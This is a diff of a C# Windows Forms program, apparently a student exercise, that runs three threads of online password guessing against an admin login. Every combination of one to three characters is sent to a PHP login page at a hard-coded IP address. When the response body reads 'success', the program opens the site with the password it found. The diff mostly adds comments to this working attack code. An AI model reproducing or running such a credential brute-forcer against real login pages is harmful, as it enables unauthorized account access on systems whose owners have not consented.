@@ -9,9 +9,11 @@ using System.Threading;
 
 namespace BruteForce
 {
+
+    // The form for the class of the brute force app.
     public partial class BruteForce : Form
     {
-
+        // The result would be put in here.
         private static string result;
         private static bool isMatched = false;
 
@@ -32,58 +34,67 @@ namespace BruteForce
             InitializeComponent();
         }
 
+        // The button click to run the brute force.
         private void BruteForceButton_Click(object sender, EventArgs e)
         {
             charactersToTestLength = charactersToTest.Length;
             Loading.Visible = true;
+            CloseButton.Visible = true;
+
+            // The first thread to run on 3 word length.
             new Thread(() =>
             {
                 startBruteForce(3);
                 if (isMatched)
-                {
+                { // Check if found and change the lables according to it.
                     this.Loading.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
                         this.Loading.Visible = false;
                         this.password.Text += result;
                         this.password.Visible = true;
                     });
-                    MessageBox.Show("The password is: " + result);
+                    // Open the site with the correct password.
                     System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
                 }
             }).Start();
+
+            // The second thread to run on 1 word length.
             new Thread(() =>
             {
                 startBruteForce(1);
                 if (isMatched)
-                {
+                { // Check if found and change the lables according to it.
                     this.Loading.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
                         this.Loading.Visible = false;
                         this.password.Text += result;
                         this.password.Visible = true;
                     });
-                    MessageBox.Show("The password is: " + result);
+                    // Open the site with the correct password.
                     System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
                 }
             }).Start();
+
+            // The third thread to run on 2 word length.
             new Thread(() =>
             {
                 startBruteForce(2);
                 if (isMatched)
-                {
+                { // Check if found and change the lables according to it.
                     this.Loading.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
                         this.Loading.Visible = false;
                         this.password.Text += result;
                         this.password.Visible = true;
                     });
-                    MessageBox.Show("The password is: " + result);
+                    // Open the site with the correct password.
                     System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);
                 }
             }).Start();
 
         }      
 
+        // This is the function to run the brute force.
         private static void startBruteForce(int keyLength)
         {
             var keyChars = createCharArray(keyLength, charactersToTest[0]);
@@ -92,11 +103,13 @@ namespace BruteForce
             createNewKey(0, keyChars, keyLength, indexOfLastChar);
         }
 
+        // Create a default array.
         private static char[] createCharArray(int length, char defaultChar)
         {
             return (from c in new char[length] select defaultChar).ToArray();
         }
 
+        // This is the function to check the keys and build the correct password.
         private static void createNewKey(int currentCharPosition, char[] keyChars, int keyLength, int indexOfLastChar)
         {
             var nextCharPosition = currentCharPosition + 1;
@@ -118,7 +131,7 @@ namespace BruteForce
                     computedKeys++;
 
                     /* The char array will be converted to a string and compared to the password. If the password
-                     * is matched the loop breaks and the password is stored as result. */
+                     * is matched so the body of the site is 'success', the loop breaks and the password is stored as result. */
 
                     WebClient client = new WebClient();
                     string theBody = null;
@@ -134,12 +147,13 @@ namespace BruteForce
                     {
                         isMatched = true;
                         result = new String(keyChars);
-                        break;
+                        return;
                     }
                 }
             }
         }
 
+        // The exit button.
         private void CloseButton_Click(object sender, EventArgs e)
         {
             Environment.Exit(0);
